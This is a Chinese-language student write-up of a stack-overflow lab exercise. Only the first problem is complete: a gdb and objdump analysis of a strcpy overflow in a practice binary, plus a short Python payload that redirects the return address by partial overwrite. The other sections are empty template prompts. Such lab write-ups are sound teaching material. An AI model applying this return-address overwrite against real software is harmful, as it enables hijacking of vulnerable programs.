# 栈溢出攻击实验

## 题目解决思路

- ### Problem 1:

  - **前言**：
    本来想用 IDA，把 problem1 拖到 IDA，在左侧栏点击 string 里的“Yes!I like ICS!”，定位到相应位置。
    AI 说要按 x 键，找到交叉引用（“从一个对象出发，找到所有用到它的地方”），但发现“There are no xrefs to aYesILikeIcs”。
    改成从 "fprintf" 按 X，成功跳转，但是内容没有用。
    搞了半天用不明白 IDA，还是用 gdb 吧。

  **1）确认程序整体流程（main）**
  反汇编 `main` 可以看出流程：

  - 先 `puts("Do you like ICS?")`
  - 检查参数个数，要求传入一个文件名
  - `fopen(argv[1], "r")`
  - `fread(buf, 1, 0x100, fp)` 把文件读到栈上缓冲区（`rbp-0x110`）
  - 在读入长度处补 `\0` 变成 C 字符串
  - `call func(buf)`

  也就是说：**ans1.txt 的内容会被当成字符串传入 `func`。**

  **2）确认漏洞点（func）**
  查看`func` 的反汇编后发现内容是：

  - `lea -0x8(%rbp), %rax`：取一个非常小的栈上地址当作目的缓冲区
  - `mov %rdx, %rsi` / `mov %rax, %rdi`：按 SysV ABI 传参，形态就是 `strcpy(dest, src)`
  - `call 0x4010b0`

  用 gdb 直接确认 `0x4010b0` 是 `strcpy@plt`：

  ```text
  (gdb) x/10i 0x4010b0
  0x4010b0: endbr64
  0x4010b4: jmp  *...(%rip)  # 0x404000 <strcpy@got.plt>
  ...
  ```

  结论：`func` 把输入字符串用 `strcpy` 拷贝进栈上的小缓冲区，**没有长度检查**，典型栈溢出。

  **3）验证“确实能覆盖返回地址”**
  把输入填成很多个 `A` 后，在 gdb 里 `backtrace` 出现大量：

  - `0x4141414141414141`

  `0x41` 是字符 `'A'` 的 ASCII，说明返回地址已被覆盖，控制流具备被劫持的条件。

  **4）定位 "Yes!I like ICS!"**
  目标字符串地址为 `0x402004`：

  ```text
  (gdb) x/s 0x402004
  0x402004: "Yes!I like ICS!"
  ```

  在终端用 objdump 搜索 `402004` 的引用：

  ```text
  $ objdump -d -M intel ./problem1 | grep -n "402004"
  168:  40121e: bf 04 20 40 00    mov    edi,0x402004
  ```

  继续看 `0x401200~0x401240` 的反汇编，发现 `func1` 直接 puts 打印 `Yes!I like ICS!`，然后 exit。
  只要让 `func` 的返回地址跳到 `func1(0x401216)` 就解决本题了。

  **5）确定偏移（padding 是 16）**
  从 `func` 的汇编可以看到目的缓冲区起点是 `rbp-0x8`。
  而返回地址在 `rbp+0x8`。
  二者距离 16.

  因此 payload 结构是：

  - `padding(16 bytes)` + `retaddr -> 0x401216`

  另外，本题的拷贝函数是 `strcpy`，遇到 `0x00` 会停止，所以不能直接随便把 8 字节地址完整塞进去；这里采用**低字节覆盖 + 终止符**的方式，确保拷贝在写完需要的字节后再停。

  ------

  **解决方案**：

  本题最终使用的 payload 文件 `ans1.txt` 为二进制流。

  生成脚本如下：

  ```python
  payload  = b"A" * 16          # 覆盖到返回地址起点（offset=16）
  payload += b"\x1e\x12\x40"    # 目标地址低 3 字节（0x40121e）
  payload += b"\x00"            # 让 strcpy 停止，并把第 4 字节写成 0
  
  with open("ans1.txt", "wb") as f:
      f.write(payload)
  ```

  ------

  - **结果**：成功输出`Yes!I like ICS!`，详见截图

### Problem 2:
- **分析**：...
- **解决方案**：payload是什么，即你的python代码or其他能体现你payload信息的代码/图片
- **结果**：附上图片

### Problem 3: 
- **分析**：...
- **解决方案**：payload是什么，即你的python代码or其他能体现你payload信息的代码/图片
- **结果**：附上图片

### Problem 4: 
- **分析**：体现canary的保护机制是什么
- **解决方案**：payload是什么，即你的python代码or其他能体现你payload信息的代码/图片
- **结果**：附上图片

## 思考与总结



## 参考资料

列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。
